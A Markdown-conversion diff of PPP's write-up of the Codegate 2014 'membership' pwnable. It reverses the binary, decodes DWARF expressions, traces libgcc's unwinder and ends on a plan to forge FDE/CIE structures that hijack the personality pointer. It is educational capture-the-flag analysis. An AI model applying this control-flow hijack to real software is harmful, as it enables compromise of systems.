@@ -1,38 +1,41 @@
 ---
-title: 'Codegate 2014: membership (800pt pwnable) write-up'
-author: PPP
+title: 'membership'
 layout: post
-permalink: /?p=1165
+excerpt_separator: <!--more-->
+authors:
+  - Brian Pak (Cai)
 categories:
-  - General News
+  - Pwn
+ctf: Codegate Quals
+year: 2014
 ---
-This is a write-up for 800 point pwnable challenge called &#8216;membership&#8217; from Codegate CTF 2014 Pre-qual round. PPP was the only solver for this challenge during the competition, so I have decided to do a write-up for the challenge. Enjoy.  (awesie and ricky solved it during the competition.)
+This is a write-up for 800 point pwnable challenge called "membership" from Codegate CTF 2014 Pre-qual round. PPP was the only solver for this challenge during the competition, so I have decided to do a write-up for the challenge. Enjoy.  (awesie and ricky solved it during the competition.)
 
-**=== If you have any trouble with poor formatting here, you can read the original post at <a href="https://www.bpak.org/blog/2014/02/codegate-2014-membership-800pt-pwnable-write-up" target="_blank">this blog</a> ===**
+<!--more-->
 
-# 1. Challenge overview
+*If you have any trouble with poor formatting here, you can read the original post at <a href="https://www.bpak.org/blog/2014/02/codegate-2014-membership-800pt-pwnable-write-up" target="_blank">this blog</a>.*
 
-You can download the copy of the binary <a href="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership" target="_blank">here</a>.  
+## Challenge overview
+
+You can download the copy of the binary <a href="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership" target="_blank">here</a>.
 During the competition, we could ssh into one of their machines to exploit and read the flag.
 
-<p style="text-align: center;">
-  <img class="size-full wp-image-1660 aligncenter" alt="membership_problem" src="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_1.png" width="305" height="309" /><img class="wp-image-1663 aligncenter" style="line-height: 1.5em;" alt="" src="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_2.png" width="364" height="313" />
-</p>
+![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_1.png)
 
-<pre class="top-set:false bottom-set:false toolbar:2 toolbar-hide:false toolbar-delay:false show-title:false striped:false marking:false ranges:false nums:false nums-toggle:false wrap:true wrap-toggle:false plain:false plain-toggle:false copy:false popup:false scroll:false expand-toggle:false decode-attributes:false trim-whitespace:false trim-code-tag:false mixed:false lang:sh highlight:0 decode:true show_mixed:false">$ file membership
-membership: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0c19bb6578cf047d8f3150628d1d82d4a205ea1d, stripped</pre>
+```
+$ file membership
+membership: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0c19bb6578cf047d8f3150628d1d82d4a205ea1d, stripped
+```
 
-As you can see, it&#8217;s a 32-bit ELF binary. So, let&#8217;s open it up in IDA and start reversing.
+As you can see, it's a 32-bit ELF binary. So, let's open it up in IDA and start reversing.
 
-<p style="text-align: center;">
-  <img class="aligncenter size-full wp-image-1671" alt="" src="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_3.png" width="347" height="452" />
-</p>
+![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_3.png)
 
-The program looks really simple. It just installs a couple signal handlers (specifically for SIGSEGV and SIGFPE) and calls a main (interesting) function, where it prompts us for the *userid* and *password*. Then, the program calculates SHA256 hash of the given password and compares with the stored hash. If the password hashes do not match, a runtime error exception is thrown and the program is aborted. If we pass in the correct password, we get a shell <img src="http://ppp.cylab.cmu.edu/wordpress/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" />
+The program looks really simple. It just installs a couple signal handlers (specifically for SIGSEGV and SIGFPE) and calls a main (interesting) function, where it prompts us for the *userid* and *password*. Then, the program calculates SHA256 hash of the given password and compares with the stored hash. If the password hashes do not match, a runtime error exception is thrown and the program is aborted. If we pass in the correct password, we get a shell :)
 
 Since guessing the correct password or cracking the hash is not viable option for us, we try to locate some other bugs that can be useful.
 
-<pre class="toolbar:1 lang:c++ mark:15,16 decode:true" title="main function">int main()
+```
 {
   int v0; // ebx@4
   char v2; // [sp+18h] [bp-10h]@4
@@ -62,25 +65,21 @@ Since guessing the correct password or cracking the hash is not viable option fo
     __cxa_throw(v0, &`typeinfo for'std::runtime_error, (const char *)&std::runtime_error::~runtime_error);
   }
   return execlp("/bin/sh", "/bin/sh", 0);
-}</pre>
+}
+```
 
-As highlighted above, the program dereferences a null pointer (*0 = 0) if the length of the password is greater than or equal to 16 bytes. Obviously it is going to trigger SIGSEGV, but do you remember what we said earlier about installing the signal handlers? And yes, one of them was SIGSEGV handler.
+As highlighted above, the program dereferences a null pointer (`*0 = 0`) if the length of the password is greater than or equal to 16 bytes. Obviously it is going to trigger SIGSEGV, but do you remember what we said earlier about installing the signal handlers? And yes, one of them was SIGSEGV handler.
 
-So, instead of crashing it miserably, the handler will be called.  
-Let&#8217;s examine what this handler does.
+So, instead of crashing it miserably, the handler will be called.
+Let's examine what this handler does.
 
-<div id="attachment_1677" style="width: 490px" class="wp-caption aligncenter">
-  <img class=" wp-image-1677 " alt="" src="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_4.png" width="480" height="521" />
-  
-  <p class="wp-caption-text">
-    SIGSEGV handler installer
-  </p>
-</div>
+![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_4.png)
 
-Now, if we look at the SIGSEGV_handler, we may think it doesn&#8217;t really do anything useful.  
-Note that it just fills up exception information and calls _\_cxa\_throw to throw exception.
+Now, if we look at the SIGSEGV_handler, we may think it doesn't really do anything useful.
+Note that it just fills up exception information and calls `cxa_throw` to throw exception.
 
-<pre class="toolbar:1 wrap:true lang:c++ decode:true" title="SIGSEGV_handler">void __noreturn SIGSEGV_handler()
+```
+void __noreturn SIGSEGV_handler()
 {
   int v0; // ebx@1
   char v1; // [sp+18h] [bp-10h]@1
@@ -93,27 +92,27 @@ Note that it just fills up exception information and calls _\_cxa\_throw to thro
   std::string::~string(&v1);
   std::allocator&lt;char&gt;::~allocator(&v2);
   __cxa_throw(v0, &`typeinfo for'std::runtime_error, (const char *)&std::runtime_error::~runtime_error);
-}</pre>
+}
+```
 
-At this point, we could go on and explain what SIGFPE_handler does as well, but we&#8217;ll skip it since it&#8217;s not that interesting and is not needed for a successful exploitation.  
-You may ask&#8230; so, what&#8217;s left?
+At this point, we could go on and explain what SIGFPE_handler does as well, but we'll skip it since it's not that interesting and is not needed for a successful exploitation.
+You may ask &mdash; so, what's left?
 
-&nbsp;
-
-# 2. Vulnerability
+## Vulnerability
 
 Notice that this is a C++ program with exception throwing. We should check how C++ exception handling works.
 
-It uses a thing called, <a href="http://en.wikipedia.org/wiki/DWARF" target="_blank">DWARF</a>, which is a standardized debugging data format for unwinding the stack and handling exceptions.
+It uses a thing called, [DWARF](http://en.wikipedia.org/wiki/DWARF), which is a standardized debugging data format for unwinding the stack and handling exceptions.
 
 *There was a CTF problem in the past that involved DWARF (called Khazad from Ghost in the Shellcode 2012): Check out these write-ups if you are interested!*
 
-  * *oxff&#8217;s write-up: <a href="http://blog.oxff.net/#k6jx7ewsq2bbid6giflq" target="_blank">http://blog.oxff.net/#k6jx7ewsq2bbid6giflq</a>*
-  * *Eindbazen&#8217;s write-up: <a href="http://eindbazen.net/2012/01/gits-2012-finals-khazad-pwn600/" target="_blank">http://eindbazen.net/2012/01/gits-2012-finals-khazad-pwn600/</a>*
+  * *[oxff's write-up](http://blog.oxff.net/#k6jx7ewsq2bbid6giflq)*
+  * *[Eindbazen's write-up](http://eindbazen.net/2012/01/gits-2012-finals-khazad-pwn600)*
 
 Anyways, you can find DWARF information can be displayed by using binutils such as *objdump* or *readelf*:
 
-<pre class="toolbar:2 striped:false nums:false lang:sh highlight:0 decode:true">$ readelf -w membership
+```
+$ readelf -w membership
 Contents of the .eh_frame section:
 
 00000000 00000014 00000000 CIE
@@ -151,17 +150,19 @@ Contents of the .eh_frame section:
 
 ...
 (omitted)
-...</pre>
+...
+```
 
-Take a close look at the entry with &#8220;pc=08048fa7..0804904d&#8221;.  
-This entry basically describes what should happen when the exception is thrown between that PC range. Note that the SIGSEGV_handler throws an exception at <span class="lang:default decode:true  crayon-inline ">0x0804901A</span> , which is in that range (that range is precisely  SIGSEGV_handler function).
+Take a close look at the entry with "pc=08048fa7..0804904d".
+This entry basically describes what should happen when the exception is thrown between that PC range. Note that the SIGSEGV_handler throws an exception at `0x0804901A` , which is in that range (that range is precisely  SIGSEGV_handler function).
 
-Ok. Now, we have to make sense of what all those operations mean <img src="http://ppp.cylab.cmu.edu/wordpress/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" />  
-DW\_CFA\_val_expression contains CFA expressions that are defined <a href="http://www.dwarfstd.org/doc/040408.1.html" target="_blank">here</a>.
+Ok. Now, we have to make sense of what all those operations mean :)
+`DW_CFA_val_expression` contains CFA expressions that are defined [here](http://www.dwarfstd.org/doc/040408.1.html).
 
-Luckily, it&#8217;s not that hard to understand the expressions. We can simply think of it as a stack machine:
+Luckily, it's not that hard to understand the expressions. We can simply think of it as a stack machine:
 
-<pre class="nums:false wrap:false lang:default decode:true">DW_OP_addr: 804b1b0         // push 0x804b1b0 (this is userid_buf)
+```
+DW_OP_addr: 804b1b0         // push 0x804b1b0 (this is userid_buf)
 DW_OP_deref                 // dereference in-place
 DW_OP_const4u: 50598931     // push 50598931
 DW_OP_const4u: 1616928864   // push 1616928864
@@ -172,7 +173,7 @@ DW_OP_addr: 804b1b4         // push 0x804b1b4 (this is userid_buf+4)
 DW_OP_deref                 // dreference in-place
 DW_OP_const4u: 84480008     // push 84480008
 DW_OP_const4u: 1616928864   // push 1616928864
-DW_OP_plus                  // add =&gt; hex(8448008 + 1616928864)[2:].decode('hex') ==&gt; 'eiph' 
+DW_OP_plus                  // add =&gt; hex(8448008 + 1616928864)[2:].decode('hex') ==&gt; 'eiph'
 DW_OP_ne                    // compare not equal
 DW_OP_bra: 29               // branch to END
 DW_OP_addr: 804b1c1         // push 0x804b1c1 (this is password_buf+1)
@@ -184,15 +185,17 @@ DW_OP_ne                    // compare not equal
 DW_OP_bra: 8                // branch to END
 DW_OP_addr: 8048cbc         // push 0x8048cbc
 DW_OP_skip: 5               // skip 5
-DW_OP_addr: 8048f18         // push 0x8048f18  (this is END)</pre>
+DW_OP_addr: 8048f18         // push 0x8048f18  (this is END)
+```
 
-So, in short, it checks if the username is **&#8220;stdchpie&#8221;** and the **password[2:5]** is equal to **&#8220;\xb1\x2e\x40&#8243;**.  
-If any of the condition fails, it transfers execution to<span class="lang:default decode:true  crayon-inline ">0x8048f18</span> , which does <span class="lang:default decode:true  crayon-inline">exit(0)</span> .
+So, in short, it checks if the username is **"stdchpie"** and the **password[2:5]** is equal to **"\xb1\x2e\x40"**.
+If any of the condition fails, it transfers execution to `0x8048f18`, which does `exit(0)`.
 
-What happens if we satisfy the conditions? Good question.  
+What happens if we satisfy the conditions? Good question.
 It basically dumps us to the following code:
 
-<pre class="toolbar:2 striped:false nums:false lang:asm decode:true">.text:08048CE8                 mov     [esp], eax
+```
+.text:08048CE8                 mov     [esp], eax
 .text:08048CEB                 call    ___cxa_begin_catch
 .text:08048CF0                 mov     dword ptr [esp], offset aNested ; "nested"
 .text:08048CF7                 call    _puts
@@ -202,19 +205,22 @@ It basically dumps us to the following code:
 .text:08048D08                 mov     edx, [edx+4]
 .text:08048D0B                 mov     [eax], edx
 .text:08048D0D                 call    ___cxa_end_catch
-.text:08048D12                 jmp     short loc_8048CC0</pre>
+.text:08048D12                 jmp     short loc_8048CC0
+```
 
-This code prints out &#8220;nested&#8221; string and writes **password[5:9]** to ***password[1:5]**. Meaning, we get to write anything in <span class="lang:default decode:true  crayon-inline ">0x402eb1??</span>  address space with any 4 byte value we choose. 4-byte write is pretty strong tool in exploitation, but when we are limited to 256 byte range, it&#8217;s difficult to make it useful. Also, it immediately jumps to<span class="lang:default decode:true  crayon-inline ">0x8048cc0</span> , where it does another null pointer dereference causing SIGSEGV to happen &#8212; thus, we get infinite &#8216;nested&#8217; string printed out.
+This code prints out "nested" string and writes `password[5:9]` to `*password[1:5]`. Meaning, we get to write anything in `0x402eb1??` address space with any 4 byte value we choose. 4-byte write is pretty strong tool in exploitation, but when we are limited to 256 byte range, it's difficult to make it useful. Also, it immediately jumps to `0x8048cc0` , where it does another null pointer dereference causing SIGSEGV to happen &mdash; thus, we get infinite "nested" string printed out.
 
-Alright. Let&#8217;s summarize what we know and have so far.
+Alright. Let's summarize what we know and have so far.
 
-  1. We can trigger a null pointer dereference, causing SIGSEGV handler to get executed (and thus, DWARF CFA expressions), by sending a password that&#8217;s >= 16 bytes.
-  2. With carefully constructed password, we can overwrite any 4-byte value to any address in between <span class="lang:default decode:true  crayon-inline">0x402eb100</span>  and <span class="lang:default decode:true  crayon-inline  crayon-selected">0x402eb1ff</span> .
+1. We can trigger a null pointer dereference, causing SIGSEGV handler to get executed (and thus, DWARF CFA expressions), by sending a password that's >= 16 bytes.
 
-The natural question is, then, **what is mapped on that memory address?  
-**With <span class="lang:default decode:true  crayon-inline ">ulimit -s unlimited</span> ,
+2. With carefully constructed password, we can overwrite any 4-byte value to any address in between `0x402eb100` and `0x402eb1ff`.
 
-<pre class="toolbar:2 striped:false nums:false lang:sh mark:15 decode:true">(gdb) info proc map
+The natural question is, then, **what is mapped on that memory address?**
+With `ulimit -s unlimited`,
+
+```
+(gdb) info proc map
 process 6207
 Mapped address spaces:
 
@@ -237,53 +243,37 @@ Mapped address spaces:
 
 ... (omitted) ...
 
-        0xbffdf000 0xc0000000    0x21000        0x0 [stack]</pre>
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+```
 
-As we can see above (highlighted), the address range falls into **libgcc**&#8216;s memory &#8212; specifically, it matched portion of its **.bss** section.
+As we can see above (highlighted), the address range falls into **libgcc**'s memory &mdash; specifically, it matched portion of its **.bss** section.
 
 So, what is there in libgcc_s.so.1, you ask.
 
-<p style="text-align: center;">
-  <img class="aligncenter size-full wp-image-1683" alt="" src="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_5.png" width="531" height="562" />
-</p>
+![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_5.png)
 
-<p style="text-align: left;">
-  Precisely, this.<br /> And that&#8217;s it.
-</p>
+Precisely, this.
 
-<p style="text-align: left;">
-  At this point, we downloaded and opened up libgcc source code to look at where some of these data structures are used, and tried to look for ways to get an EIP control.
-</p>
+And that's it.
 
-<p style="text-align: left;">
-  So the journey begins.
-</p>
+At this point, we downloaded and opened up libgcc source code to look at where some of these data structures are used, and tried to look for ways to get an EIP control.
 
-<h1 style="text-align: left;">
-  3. libgcc source code analysis
-</h1>
+So the journey begins.
 
-<p style="text-align: left;">
-  Note that this step took the longest since we had to actually understand part of the gcc code when it does stack unwinding and handling the exception.
-</p>
+## libgcc source code analysis
 
-<p style="text-align: left;">
-  You can download the source for gcc <a href="http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-4.8/gcc-4.8_4.8.1.orig.tar.gz" target="_blank">here</a> (gcc-4.8.1, Ubuntu 13.01).
-</p>
+Note that this step took the longest since we had to actually understand part of the gcc code when it does stack unwinding and handling the exception.
 
-<p style="text-align: left;">
-  During the competition, we chose each data structure of interest and traced backwards to find out whether by controlling said structure we can influence anything (e.g. function pointer) on callers while handling exceptions to hijack the control flow.
-</p>
+You can download the source for gcc <a href="http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-4.8/gcc-4.8_4.8.1.orig.tar.gz" target="_blank">here</a> (gcc-4.8.1, Ubuntu 13.01).
 
-<p style="text-align: left;">
-  Since we now know which one can be used to control EIP, we will start from there: <strong>frame_hdr_cache_head</strong> is our target. [It is very well be possible to solve the challenge with different method/structure, but this is the one that we ended up using during the CTF.]
-</p>
+During the competition, we chose each data structure of interest and traced backwards to find out whether by controlling said structure we can influence anything (e.g. function pointer) on callers while handling exceptions to hijack the control flow.
 
-<p style="text-align: left;">
-  If we locate the place that <strong>frame_hdr_cache_head</strong> is referenced, we land in the middle of <strong>_Unwind_IteratePhdrCallback</strong> function in <em>libgcc/unwind-dw2-fde.dip.c</em>.
-</p>
+Since we now know which one can be used to control EIP, we will start from there: <strong>frame_hdr_cache_head</strong> is our target. [It is very well be possible to solve the challenge with different method/structure, but this is the one that we ended up using during the CTF.]
 
-<pre class="start-line:199 lang:c mark:9 decode:true" title="unwind-dw2-fde-dip.c">... (omitted) ...
+If we locate the place that **frame_hdr_cache_head** is referenced, we land in the middle of **\_Unwind_IteratePhdrCallback** function in _libgcc/unwind-dw2-fde.dip.c_.
+
+```
+... (omitted) ...
       /* Find data-&gt;pc in shared library cache.
          Set load_base, p_eh_frame_hdr and p_dynamic
          plus match from the cache and goto
@@ -311,16 +301,19 @@ So, what is there in libgcc_s.so.1, you ask.
             }
           goto found;
         }
-... (omitted) ...</pre>
+... (omitted) ...
+```
 
-**frame\_hdr\_cache_head** points to the first element of a singly linked list that contains **frame\_hdr\_cache_element**(s).  
-The code iterates through the list and finds the entry for <span class="lang:default decode:true  crayon-inline ">data->pc</span>  in cache. <span class="lang:default decode:true  crayon-inline ">data->pc</span>  is the program counter of the frame we are trying to handle the exception for.
+**frame\_hdr\_cache_head** points to the first element of a singly linked list that contains **frame\_hdr\_cache_element**(s).
+
+The code iterates through the list and finds the entry for `data->pc` in cache. `data->pc` is the program counter of the frame we are trying to handle the exception for.
 
 This cache is filled in as the program discovers exception handler frames (eh_frame).
 
 The following is the struct definition for **frame\_hdr\_cache_element**:
 
-<pre class="toolbar:2 nums:false lang:c decode:true">static struct frame_hdr_cache_element
+```
+static struct frame_hdr_cache_element
 {
   _Unwind_Ptr pc_low;
   _Unwind_Ptr pc_high;
@@ -328,24 +321,26 @@ The following is the struct definition for **frame\_hdr\_cache_element**:
   const ElfW(Phdr) *p_eh_frame_hdr;
   const ElfW(Phdr) *p_dynamic;
   struct frame_hdr_cache_element *link;
-} frame_hdr_cache[FRAME_HDR_CACHE_SIZE];</pre>
+} frame_hdr_cache[FRAME_HDR_CACHE_SIZE];
+```
 
-So, if we control where **frame\_hdr\_cache_head** points to, we can also construct/control the elements inside. Before we dive into what happens when we find an element in the cache and &#8216;**goto found**&#8216;, let&#8217;s step back for a minute and see if we can even get to here and what that allows us to do.
+So, if we control where **frame\_hdr\_cache_head** points to, we can also construct/control the elements inside. Before we dive into what happens when we find an element in the cache and **goto found**, let's step back for a minute and see if we can even get to here and what that allows us to do.
 
-The function we just looked at (**\_Unwind\_IteratePhdrCallback**) is called from **\_Unwind\_Find_FDE** in *unwind-dw2-fde-dip.c*.  
-Then, **\_Unwind\_Find_FDE** function is called from **uw\_frame\_state_for** function in *unwind-dw2.c*.  
+The function we just looked at (**\_Unwind\_IteratePhdrCallback**) is called from **\_Unwind\_Find_FDE** in *unwind-dw2-fde-dip.c*.
+Then, **\_Unwind\_Find_FDE** function is called from **uw\_frame\_state_for** function in *unwind-dw2.c*.
 **uw\_frame\_state_for** function is called from **\_Unwind\_RaiseException** function in *unwind.inc*, which provides an interface to raise an exception given an exception object.
 
-Where does **\_Unwind\_RaiseException** get called, then?  
-It gets called by **_\_cxa\_throw**, and if you remember, our SIGSEGV_handler invokes this function to raise an exception.
+Where does **\_Unwind\_RaiseException** get called, then?
+It gets called by **\_\_cxa\_throw**, and if you remember, our SIGSEGV_handler invokes this function to raise an exception.
 
 Alright. We now have confirmed that we can get to that code by causing the binary to throw an exception and letting libgcc unwinds/handles the exception.
 
 But is there anything interesting in this code path such that we can give us EIP control? Yes.
 
-Let&#8217;s review **\_Unwind\_RaiseException** a little bit:
+Let's review **\_Unwind\_RaiseException** a little bit:
 
-<pre class="start-line:78 lang:c mark:22,36-37 decode:true" title="unwind.inc">... (omitted) ...
+```
+... (omitted) ...
 /* Raise an exception, passing along the given exception object.  */
 
 _Unwind_Reason_Code LIBGCC2_UNWIND_ATTRIBUTE
@@ -404,14 +399,16 @@ _Unwind_RaiseException(struct _Unwind_Exception *exc)
 
   uw_install_context (&this_context, &cur_context);
 }
-... (omitted) ...</pre>
+... (omitted) ...
+```
 
 Notice the highlighted lines. What do you see?
 
-A function pointer getting called! And we **\*may\*** be able to control <span class="lang:default decode:true  crayon-inline ">fs.personality</span> .  
-Let&#8217;s find out!
+A function pointer getting called! And we **\*may\*** be able to control `fs.personality`.
+Let's find out!
 
-<pre class="start-line:1160 lang:c mark:21-22,38 decode:true" title="unwind-dw2.c">... (omitted) ...
+```
+... (omitted) ...
 /* Given the _Unwind_Context CONTEXT for a stack frame, look up the FDE for
    its caller and decode it into FS.  This function also sets the
    args_size and lsda members of CONTEXT, as they are really information
@@ -453,14 +450,16 @@ uw_frame_state_for (struct _Unwind_Context *context, _Unwind_FrameState *fs)
     /* CIE contained unknown augmentation.  */
     return _URC_FATAL_PHASE1_ERROR;
 
-... (omitted) ...</pre>
+... (omitted) ...
+```
 
-Remember that the struct pointer that we are interested in tracing is **fs** (aka 2nd argument).  
+Remember that the struct pointer that we are interested in tracing is **fs** (aka 2nd argument).
 Wee see here that **\_Unwind\_Find_FDE** is used to get **fde** (which is used to get **cie**), and **extract\_cie\_info** takes **cie** and **fs** as its first and third argument, respectively.
 
 So, what happens in **extract\_cie\_info**?
 
-<pre class="nums:false lang:c mark:32-33 decode:true" title="unwind-dw2.c">... (omitted) ...
+```
+... (omitted) ...
  378 /* Extract any interesting information from the CIE for the translation
  379    unit F belongs to.  Return a pointer to the byte after the augmentation,
  380    or NULL if we encountered an undecipherable augmentation.  */
@@ -496,14 +495,16 @@ So, what happens in **extract\_cie\_info**?
  461           aug += 1;
  462         }
 
-... (omitted) ...</pre>
+... (omitted) ...
+```
 
-Cool.  
-**extract\_cie\_info** parses **cie** and updates <span class="lang:default decode:true  crayon-inline ">fs->personality</span> . We&#8217;ll work out the details later.
+Cool.
+**extract\_cie\_info** parses **cie** and updates `fs->personality`. We'll work out the details later.
 
 Okay, now, we have to look into **\_Unwind\_Find_FDE** function to find out what it returns (**fde**) is:
 
-<pre class="start-line:459 lang:default mark:20 decode:true" title="unwind-dw2-fde-dip.c">... (omitted) ...
+```
+... (omitted) ...
 
 const fde *
 _Unwind_Find_FDE (void *pc, struct dwarf_eh_bases *bases)
@@ -534,25 +535,24 @@ _Unwind_Find_FDE (void *pc, struct dwarf_eh_bases *bases)
   return data.ret;
 }
 
-... (omitted) ...</pre>
+... (omitted) ...
+```
 
-As we discussed earlier, **\_Unwind\_Find_FDE** calls **\_Unwind\_IteratePhdrCallback**, which fills the **data** struct.  
+As we discussed earlier, **\_Unwind\_Find_FDE** calls **\_Unwind\_IteratePhdrCallback**, which fills the **data** struct.
 Then, it returns **data.ret**.
 
-Whoa. After that chain of functions, we now came back to where we started &#8212; **\_Unwind\_IteratePhdrCallback**.  
-<span style="text-decoration: underline;">Warning</span>: This is a really long function :p
+Whoa. After that chain of functions, we now came back to where we started &mdash; **\_Unwind\_IteratePhdrCallback**.
 
-<p style="text-align: left;">
-  To show a good idea of the call stack, here&#8217;s a diagram:
-</p>
+**Warning**: This is a really long function :p
 
-<p style="text-align: center;">
-  <a href="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_6.png"><img class="aligncenter  wp-image-1685" alt="" src="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_6.png" width="476" height="323" /></a>
-</p>
+To show a good idea of the call stack, here's a diagram:
+
+![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_6.png)
 
 Fortunately, we do not have to look at all of its details. As we learned earlier, the cache for *eh\_frame\_hdr* is looked up and the following is performed in case the entry was found:
 
-<pre class="nums:false lang:c mark:80 decode:true" title="unwind-dw2-fde-dip.c">... (omitted) ...
+```
+... (omitted) ...
 
 309  found:
 310
@@ -637,12 +637,15 @@ Fortunately, we do not have to look at all of its details. As we learned earlier
 418         }
 419     }
 
-... (omitted) ...</pre>
+... (omitted) ...
+```
 
-Note that <span class="lang:default decode:true  crayon-inline ">data->ret</span>  is set to **f** on line 415, where **f** is a FDE pointer found by performing binary search.  
+Note that `data->ret` is set to **f** on line 415, where **f** is a FDE pointer found by performing binary search.
+
 Comments from unwind-dw2-fde.h briefly describes FDE & CIE lookup:
 
-<pre class="start-line:112 lang:c decode:true" title="unwind-dw2-fde.h">/* Terminology:
+```
+/* Terminology:
    CIE - Common Information Element
    FDE - Frame Descriptor Element
 
@@ -659,11 +662,13 @@ Comments from unwind-dw2-fde.h briefly describes FDE & CIE lookup:
    a) in a linear search, find the shared image (i.e. DLL) containing
       the PC
    b) using the FDE table for that shared object, locate the FDE using
-      binary search (which requires the sorting).  */</pre>
+      binary search (which requires the sorting).  */
+```
 
-Let&#8217;s review some of the primitive structs and functions that are used in above code to get a better understanding of what&#8217;s going on. We will make references to these as we explain the code later.
+Let's review some of the primitive structs and functions that are used in above code to get a better understanding of what's going on. We will make references to these as we explain the code later.
 
-<pre class="lang:c decode:true" title="Useful structs">static struct frame_hdr_cache_element
+```
+static struct frame_hdr_cache_element
 {
   _Unwind_Ptr pc_low;
   _Unwind_Ptr pc_high;
@@ -712,11 +717,13 @@ struct fde_table
 {
   signed initial_loc __attribute__ ((mode (SI)));
   signed fde __attribute__ ((mode (SI)));
-}</pre>
+}
+```
 
 And, these are some functions that are used when parsing data:
 
-<pre class="lang:c decode:true" title="Useful functions">/* Load an encoded value from memory at P.  The value is returned in VAL;
+```
+/* Load an encoded value from memory at P.  The value is returned in VAL;
    The function returns P incremented past the value.  BASE is as given
    by base_of_encoded_value for this encoding in the appropriate context.  */
 
@@ -745,70 +752,58 @@ read_uleb128 (const unsigned char *p, _uleb128_t *val)
    not available.  */
 
 static _Unwind_Ptr
-base_of_encoded_value (unsigned char encoding, struct _Unwind_Context *context)</pre>
+base_of_encoded_value (unsigned char encoding, struct _Unwind_Context *context)
+```
 
-That was a lot of stuff, but don&#8217;t worry about understanding/remembering all of them since we will go over the logic at somewhat high-level.
+That was a lot of stuff, but don't worry about understanding/remembering all of them since we will go over the logic at somewhat high-level.
 
 When an exception is thrown, the PC is looked up to find a correct FDE for the current function.
 
   1. First, they search the shared library cache linked-list (which we control the head pointer).
-  2. Once the entry is found, they get unw_*eh\_frame\_hdr* (**hdr** variable) by adding **p_vaddr** and **load_base**. Then, they make sure the version of **hdr **is 1. 
+  2. Once the entry is found, they get unw_*eh\_frame\_hdr* (**hdr** variable) by adding **p_vaddr** and **load_base**. Then, they make sure the version of **hdr **is 1.
       * **hdr** also contains the flags for encoding schemes for **eh\_frame\_ptr**, **fde_count**, and **table**.
       * Encoding flag is defined in *unwind-pe.h*, but important ones are: **DW\_EH\_PE_pcrel** (0x10, pc-relative), **DW\_EH\_PE_absptr** (0x00, absolute),  **DW\_EH\_PE_sdata4** (0x0b, signed 4 byte), **DW\_EH\_PE_udata4** (0x03, unsigned 4 byte).
   3. Parse **eh_frame** and **fde_count**
-  4. Perform binary search in **table** for the <span class="lang:default decode:true  crayon-inline ">data->pc</span>  against <span class="lang:default decode:true  crayon-inline ">table[i].initial_loc + data_base</span> , where **data_base** is **hdr**.
-  5. When found an element in **table**, set **f** to <span class="lang:default decode:true  crayon-inline ">table[mid].fde + data_base</span>  (thus, calculating the FDE pointer).
-  6. Final check is done by parsing the **range** to ensure that this FDE record covers data->pc  
-    (<span class="lang:default decode:true  crayon-inline">table[mid].initial_loc + data_base <= data->pc < table[mid].initial_loc + data_base + range</span> )
-  7. <span class="lang:default decode:true  crayon-inline ">data->ret</span>  is filled with **f**.
+  4. Perform binary search in **table** for the `data->pc`  against `table[i].initial_loc + data_base` , where **data_base** is **hdr**.
+  5. When found an element in **table**, set **f** to `table[mid].fde + data_base`  (thus, calculating the FDE pointer).
+  6. Final check is done by parsing the **range** to ensure that this FDE record covers data->pc
+    (`table[mid].initial_loc + data_base <= data->pc < table[mid].initial_loc + data_base + range` )
+  7. `data->ret` is filled with **f**.
 
-<p style="text-align: left;">
-  It&#8217;s important to carefully construct a (fake) FDE record since it holds <strong>CIE_delta</strong> field, which is used to locate the CIE record to be parsed later (for personality function pointer).
-</p>
+It's important to carefully construct a (fake) FDE record since it holds <strong>CIE_delta</strong> field, which is used to locate the CIE record to be parsed later (for personality function pointer).
 
-<p style="text-align: left;">
-  Only piece that we haven&#8217;t visited yet is <strong>extract_cie_info</strong>, but we will visit it as we develop an exploit payload <img src="http://ppp.cylab.cmu.edu/wordpress/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" />
-</p>
+Only piece that we haven't visited yet is **extract_cie_info**, but we will visit it as we develop an exploit payload :)
 
-<h1 style="text-align: left;">
-  4. Exploit development
-</h1>
+## Exploit development
 
-<p style="text-align: left;">
-  Finally, we can start writing some <del>evil</del> awesome payload to pwn this binary.
-</p>
+Finally, we can start writing some ~evil~ awesome payload to pwn this binary.
 
-<p style="text-align: left;">
-  Here&#8217;s our plan for the attack:
-</p>
+Here's our plan for the attack:
 
-  1. <span style="line-height: 1.5em;">Overwrite </span><strong style="line-height: 1.5em;">frame_hdr_cache_head</strong> (0x402eb118)<span style="line-height: 1.5em;"> to point to our <strong>stdin</strong> buffer (0x40025000 + 0x1c for skipping userid/password/padding).</span>
-  2. Construct fake structs: 
+  1. Overwrite **frame_hdr_cache_head** (0x402eb118) to point to our **stdin** buffer (0x40025000 + 0x1c for skipping userid/password/padding)
+  2. Construct fake structs:
       * **cache_entry** (frame\_hdr\_cache_element)
       * **p\_eh\_frame_hdr** (Elf32_Phdr)
       * **hdr  **(unw\_eh\_frame_hdr)
       * **table** (fde_table)
       * **fde** (dwarf_fde)
       * **cie** (dwarf_cide)
